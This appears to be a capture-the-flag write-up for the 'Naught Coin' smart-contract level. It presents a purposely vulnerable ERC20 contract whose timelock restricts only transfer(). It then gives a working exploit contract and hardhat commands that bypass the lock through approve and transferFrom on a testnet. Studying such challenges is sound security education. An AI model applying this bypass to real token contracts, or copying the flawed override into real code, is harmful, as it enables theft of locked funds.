# Level 15: Naught Coin Challenge

## Challenge Description

This challenge involves an ERC20 token called NaughtCoin that has a timelock restricting token transfers. As a token holder, you're not supposed to be able to transfer your tokens until 10 years have passed. However, there's a vulnerability in the implementation. The goal is to transfer all tokens from the player account before the timelock expires.

## Contract Location

The challenge contract is located at:
```
/contracts/level-15-naught-coin/NaughtCoin.sol
```

## Understanding the Challenge

The `NaughtCoin` contract inherits from the OpenZeppelin ERC20 implementation and adds a timelock mechanism to prevent the player from transferring tokens for 10 years. Here's the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

### Key Observations

1. The contract inherits from OpenZeppelin's ERC20 implementation.
2. It overrides the `transfer` function and adds a `lockTokens` modifier.
3. The `lockTokens` modifier prevents the player from transferring tokens until the timelock expires (10 years).
4. However, the contract only overrides the `transfer` function, but not other ERC20 functions that can move tokens.

## Winning Strategy

The vulnerability lies in the fact that the contract only restricts the `transfer` function but not other token movement functions from the ERC20 standard, such as `transferFrom`.

To exploit this:

1. First, approve a separate account or contract to spend tokens on your behalf using the `approve` function.
2. Then, use `transferFrom` to move the tokens from the player's account to another address.

Since the `transferFrom` function is inherited from the ERC20 implementation and isn't overridden with the timelock modifier, it can be used to bypass the timelock restriction entirely.

## Hint for Thinking

Ask yourself:
* What methods can move tokens in the ERC20 standard?
* Which of those methods are restricted by the timelock in this contract?
* How can you use the unrestricted methods to bypass the timelock?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

### Understanding the Vulnerability

The NaughtCoin contract only restricts the `transfer` function with the timelock. However, as an ERC20 token, it inherits several other functions from OpenZeppelin's implementation:

1. `transfer`: Directly transfers tokens from the caller to a recipient (restricted by timelock)
2. `transferFrom`: Transfers tokens from one address to another using an allowance mechanism (not restricted)
3. `approve`: Approves another address to spend tokens on behalf of the caller (not restricted)

Since only the `transfer` function is overridden with the timelock, we can use the combination of `approve` and `transferFrom` to move tokens without triggering the timelock.

### Exploit Contract

The solution involves creating a contract that uses `transferFrom` to move tokens from the player to the contract itself:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function player() external view returns (address);
}

contract NaughtCoinExploit {
    address public naughtCoinAddress;
    INaughtCoin public naughtCoin;
    address public owner;

    constructor(address _naughtCoinAddress) {
        naughtCoinAddress = _naughtCoinAddress;
        naughtCoin = INaughtCoin(naughtCoinAddress);
        owner = msg.sender;
    }
    
    function bypassTimeLock() external {
        require(msg.sender == owner, "Only owner can bypass the timelock");
        
        address player = naughtCoin.player();
        uint256 playerBalance = naughtCoin.balanceOf(player);
        
        // Transfer all tokens from the player to the contract address
        naughtCoin.transferFrom(player, address(this), playerBalance);
    }
    
    function checkSuccess() external view returns (bool) {
        address player = naughtCoin.player();
        return naughtCoin.balanceOf(player) == 0;
    }
}
```

### Execution Steps

1. **Deploy the NaughtCoin Contract**

   ```shell
   npx hardhat deploy --tags naught-coin --network sepolia
   ```

2. **Deploy the Exploit Contract**

   ```shell
   TARGET_ADDRESS=0xYourNaughtCoinAddress npx hardhat deploy --tags naught-coin-solution --network sepolia
   ```

3. **Execute the Exploit**

   First, the player must approve the exploit contract to spend tokens, then the script will execute the exploit to transfer tokens to the contract itself:

   ```shell
   EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xNaughtCoinAddress npx hardhat run scripts/level-15-naught-coin/execute-naught-coin-exploit.ts --network sepolia
   ```

   The script will verify if the exploit was successful by checking if the player's balance is zero.

## Key Insights

1. **Incomplete Access Control**: The contract only restricts one function (`transfer`) but not the complete set of functions that can move tokens.

2. **ERC20 Standard Knowledge**: Understanding the ERC20 standard and its functions is crucial. The token can be moved not just with `transfer` but also with `transferFrom`.

3. **Inheritance Considerations**: When overriding functions from a parent contract, it's important to consider all functions that might perform similar operations.

4. **Defense in Depth**: For critical restrictions like timelocks, apply the restriction at multiple levels or consider using a more comprehensive approach such as overriding all token movement functions or using OpenZeppelin's TokenTimelock.
